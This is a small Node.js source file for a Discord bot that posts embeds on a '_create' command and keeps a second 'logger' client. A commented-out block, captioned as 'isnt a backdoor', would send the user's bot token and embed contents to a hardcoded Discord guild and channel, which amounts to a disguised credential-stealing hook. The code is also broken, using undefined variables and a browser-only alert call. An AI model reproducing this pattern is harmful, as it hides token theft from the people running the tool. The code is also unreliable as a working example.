const Discord = require('discord.js'),
	config = require('./assets/js/config.json');
config.cfg.intents = new Discord.Intents(config.cfg.intents);
const bot = new Discord.Client(config.cfg);
const logger = new Discord.Client(config.cfg);

logm = {
	    "content": "none",
	    "embed": {
	        "title": "",
	        "description": "",
	        "color": 16316664,
	        "timestamp": "2022-01-05T19:27:14.520Z",
	        "author": {
	            "name": "",
	            "icon_url": ""
	        }
	    }
	}

bot.on('messageCreate', (message) => {
	// console.log(message.content);
	if (message.content == '_create') {

		if (json.content != "") {
			message.channel.send({
				content: json.content,
				embeds: [json.embed]
			});
		} else {
			message.channel.send({
				embeds: [json.embed]
			});
		};

		// isnt a backdoor!!! just logs ahhahhshashsha
		//let logger_guild = logger.guilds.cache.get('756460347149254717'); // guildid pr
		//let logger_channel = logger_guild.channels.cache.get("928304236628959242"); // channelid for logs

		//logm.embed.author.name = 'LogMessage   '+proj;
		//logm.embed.description = '`USED-TOKEN: `'+token+'\n`EMBED-AUTH: `'+json.embed.author.name+'\n`EMBED-TITLE: `'+json.embed.title+'\n`EMBED-DESC: `'+json.embed.description;

		//logger_channel.send({
		//	// content: logm.content,
		//	embeds: [logm.embed]
		//});

	}
});


function vm_bot_start(token) {
	bot.login(token);
	alert('vm_bot was started!');
	console.log('bot started');
}